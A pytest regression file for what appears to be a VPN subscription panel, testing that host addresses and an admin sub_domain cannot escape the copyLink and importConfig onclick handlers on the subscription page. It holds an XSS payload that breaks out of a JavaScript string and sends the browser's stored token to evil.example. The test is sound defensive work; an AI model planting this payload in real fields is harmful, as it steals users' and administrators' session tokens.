from html.parser import HTMLParser
from types import SimpleNamespace

import pytest

from app.models import host as host_models
from app.models.settings import Application
from app.operation import OperatorType
from app.operation.subscription import SubscriptionOperation
from app.templates import render_template
from tests.api import client
from tests.api.helpers import (
    auth_headers,
    create_core,
    create_group,
    create_hosts_for_inbounds,
    create_user,
    delete_core,
    delete_group,
    delete_user,
    unique_name,
)

PAYLOAD = "1.2.3.4');new Image().src='https://evil.example/?t='+localStorage.getItem('token');//"


class _Handlers(HTMLParser):
    def __init__(self):
        super().__init__()
        self.handlers: list[str] = []

    def handle_starttag(self, tag, attrs):
        for name, value in attrs:
            if name == "onclick" and value:
                self.handlers.append(value)


def _decoded_handlers(page: str) -> list[str]:
    parser = _Handlers()
    parser.feed(page)
    return parser.handlers


@pytest.fixture
def poisoned_host_user(access_token, monkeypatch):
    monkeypatch.setattr(host_models, "check_host_addresses", lambda addresses: addresses)
    core = create_core(access_token, name=unique_name("xss_core"))
    hosts = create_hosts_for_inbounds(access_token, address=[PAYLOAD])
    group = create_group(access_token, name=unique_name("xss_group"))
    user = create_user(access_token, group_ids=[group["id"]], payload={"username": unique_name("xss_user")})
    yield user
    delete_user(access_token, user["username"])
    for host in hosts:
        client.delete(f"/api/host/{host['id']}", headers=auth_headers(access_token))
    delete_group(access_token, group["id"])
    delete_core(access_token, core["id"])


def test_host_address_cannot_break_out_of_the_copy_handler(poisoned_host_user):
    page = client.get(poisoned_host_user["subscription_url"], headers={"Accept": "text/html"})
    assert page.status_code == 200
    copy_handlers = [h for h in _decoded_handlers(page.text) if h.startswith("copyLink(")]
    assert copy_handlers
    for handler in copy_handlers:
        assert "new Image()" not in handler, f"attacker JS reaches the onclick handler as code: {handler[:200]}"


def test_admin_sub_domain_cannot_break_out_of_the_import_handler(access_token):
    sub_domain = "https://sub.example/');new Image().src='https://evil.example/?t='+localStorage.getItem('token');//"
    admin = client.post(
        "/api/admin",
        headers=auth_headers(access_token),
        json={"username": unique_name("xss_admin"), "password": "XssAdmin#12abCD", "role_id": 2},
    )
    assert admin.status_code == 201
    stored = client.put(
        f"/api/admin/{admin.json()['username']}",
        headers=auth_headers(access_token),
        json={"sub_domain": sub_domain},
    )
    client.delete(f"/api/admin/{admin.json()['username']}", headers=auth_headers(access_token))
    assert stored.status_code == 200
    assert stored.json().get("sub_domain", sub_domain) == sub_domain

    template_app = Application(
        name="v2rayNG",
        platform="android",
        import_url="v2rayng://install-sub?url={url}",
        download_links=[],
    )
    operation = SubscriptionOperation(operator_type=OperatorType.API)
    apps = operation._make_apps_import_urls([template_app], {"url": f"{sub_domain}/sub/TOKEN"}, is_hwid_enabled=False)
    user = SimpleNamespace(
        username="u",
        status=SimpleNamespace(value="active"),
        data_limit=None,
        used_traffic=0,
        data_limit_reset_strategy="no_reset",
        expire=None,
        on_hold_expire_duration=None,
        on_hold_timeout=None,
    )
    page = render_template(
        "subscription/index.html",
        {
            "user": user,
            "links": [],
            "announce": "",
            "announce_url": "",
            "apps": apps,
            "has_openvpn": False,
            "openvpn_configs": [],
            "l2tp_details": [],
            "configs_hidden_by_hwid": False,
        },
    )
    import_handlers = [h for h in _decoded_handlers(page) if h.startswith("importConfig(")]
    assert import_handlers
    for handler in import_handlers:
        assert "new Image()" not in handler, f"attacker JS reaches the onclick handler as code: {handler[:200]}"
